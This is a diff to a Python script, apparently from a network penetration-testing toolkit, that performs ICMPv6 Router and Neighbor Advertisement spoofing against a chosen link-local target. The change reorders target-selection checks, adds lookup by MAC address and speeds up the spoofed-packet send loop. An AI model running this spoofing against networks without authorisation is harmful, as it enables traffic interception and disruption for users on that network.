@@ -88,7 +88,7 @@ if __name__ == '__main__':
         your_ipv6_link_address: str = base.get_interface_ipv6_link_address(current_network_interface)
         # endregion
 
-        # region Global variables
+        # region Local variables
         techniques = {
             1: 'ICMPv6 RA (Router Advertisement) Spoofing',
             2: 'ICMPv6 NA (Neighbor Advertisement) Spoofing'
@@ -105,6 +105,67 @@ if __name__ == '__main__':
         reachable_time: int = 2000
         retrans_timer: int = 2000
         advertisement_interval: int = 2000
+        # endregion
+
+        # region Check arguments: target_ip and target_mac
+
+        # region Check argument: target_mac
+        if args.target_mac is not None:
+            assert base.mac_address_validation(args.target_mac), \
+                'Bad value "-m, --target_mac": ' + base.error_text(args.target_mac) + \
+                '; Example MAC address: ' + base.info_text('12:34:56:78:90:ab')
+            target_mac_address = str(args.target_mac).lower()
+        # endregion
+
+        # region Set variable for scan results
+        target: Union[None, Dict[str, str]] = None
+        # endregion
+
+        # region Search targets in local network
+        if args.target_ip is None:
+            base.print_info('Search IPv6 alive hosts ....')
+            ipv6_devices = scanner.find_ipv6_devices(network_interface=current_network_interface, timeout=3, retry=3,
+                                                     exclude_ipv6_addresses=[gateway_ipv6_address])
+            # Target IPv6 and MAC address is not set
+            if target_mac_address is None:
+                target = scanner.ipv6_device_selection(ipv6_devices)
+                target_ipv6_address = target['ip-address']
+                target_mac_address = target['mac-address']
+
+            # Target MAC address is set but target IPv6 is not set
+            else:
+                for ipv6_device in ipv6_devices:
+                    if ipv6_device['mac-address'] == target_mac_address:
+                        target_ipv6_address = ipv6_device['ip-address']
+                assert target_ipv6_address is not None, \
+                    'Could not found IPv6 device with MAC address: ' + base.error_text(target_mac_address)
+        # endregion
+
+        # region Check argument: target_ip
+        else:
+            assert args.target_mac is not None, \
+                'Target IPv6 address is set. Please set target MAC address "-m, --target_mac"'
+            assert base.ipv6_address_validation(args.target_ip), \
+                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + '; Failed to validate ipv6 address!'
+            assert str(args.target_ip).startswith('fe80::'), \
+                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
+                '; Target link local ipv6 address must be starts with: ' + base.info_text('fe80::')
+            assert args.target_ip != your_ipv6_link_address, \
+                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
+                '; Target IPv6 address is your link local IPv6 address!'
+            target_ipv6_address = args.target_ip
+        # endregion
+
+        # region Print Target information
+        base.print_success('Target IPv6 address: ', target_ipv6_address)
+        base.print_success('Target MAC address: ', target_mac_address)
+        if target is not None:
+            if isinstance(target, dict):
+                if 'vendor' in target.keys():
+                    base.print_success('Target Vendor: ', target['vendor'])
+        target = None
+        # endregion
+
         # endregion
 
         # region Set technique
@@ -207,10 +268,12 @@ if __name__ == '__main__':
 
         # region Print Gateway and DNS server information
         base.print_success('Gateway IPv6 address: ', gateway_ipv6_address)
-        base.print_success('Gateway MAC address: ', gateway_mac_address)
+        if gateway_mac_address is not None:
+            base.print_success('Gateway MAC address: ', gateway_mac_address)
         if router_advertisement_data is not None:
             base.print_success('Gateway Vendor: ', router_advertisement_data['vendor'])
-        base.print_success('DNS IPv6 address: ', dns_ipv6_address)
+        if dns_ipv6_address is not None:
+            base.print_success('DNS IPv6 address: ', dns_ipv6_address)
         base.print_success('IPv6 prefix: ', prefix)
         base.print_success('MTU: ', str(mtu))
         base.print_success('Router lifetime (s): ', str(router_lifetime))
@@ -218,58 +281,10 @@ if __name__ == '__main__':
         base.print_success('Retrans timer (ms): ', str(retrans_timer))
         # endregion
 
-        # endregion
-
-        # region Check arguments: target_ip and target_mac
-
-        # region Check argument: target_mac
-        if args.target_mac is not None:
-            assert base.mac_address_validation(args.target_mac), \
-                'Bad value "-m, --target_mac": ' + base.error_text(args.target_mac) + \
-                '; Example MAC address: ' + base.info_text('12:34:56:78:90:ab')
-            target_mac_address = str(args.target_mac).lower()
-        # endregion
-
-        # region Set variable for scan results
-        target: Union[None, Dict[str, str]] = None
-        # endregion
-
-        # region Search targets in local network
-        if args.target_ip is None:
-            base.print_info('Search IPv6 alive hosts ....')
-            ipv6_devices = scanner.find_ipv6_devices(network_interface=current_network_interface, timeout=3, retry=3,
-                                                     exclude_ipv6_addresses=[gateway_ipv6_address])
-            target = scanner.ipv6_device_selection(ipv6_devices)
-            target_ipv6_address = target['ip-address']
-            target_mac_address = target['mac-address']
-        # endregion
-
-        # region Check argument: target_ip
-        else:
-            assert args.target_mac is not None, \
-                'Target IPv6 address is set. Please set target MAC address "-m, --target_mac"'
-            assert base.ipv6_address_validation(args.target_ip), \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + '; Failed to validate ipv6 address!'
-            assert str(args.target_ip).startswith('fe80::'), \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
-                '; Target link local ipv6 address must be starts with: ' + base.info_text('fe80::')
-            assert args.target_ip != your_ipv6_link_address, \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
-                '; Target IPv6 address is your link local IPv6 address!'
-            assert args.target_ip != gateway_ipv6_address, \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
-                '; Target IPv6 address is gateway link local IPv6 address!'
-            target_ipv6_address = args.target_ip
-        # endregion
-
-        # region Print Target information
-        base.print_success('Target IPv6 address: ', target_ipv6_address)
-        base.print_success('Target MAC address: ', target_mac_address)
-        if target is not None:
-            if isinstance(target, dict):
-                if 'vendor' in target.keys():
-                    base.print_success('Target Vendor: ', target['vendor'])
-        target = None
+        # region Check target IP and gateway IP
+        assert args.target_ip != gateway_ipv6_address, \
+            'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
+            '; Target IPv6 address is gateway link local IPv6 address!'
         # endregion
 
         # endregion
@@ -314,7 +329,8 @@ if __name__ == '__main__':
         while True:
             for spoof_packet in spoof_packets:
                 raw_socket.send(spoof_packet)
-                sleep(0.5)
+                sleep(0.25)
+        # endregion
 
     except KeyboardInterrupt:
         raw_socket.close()
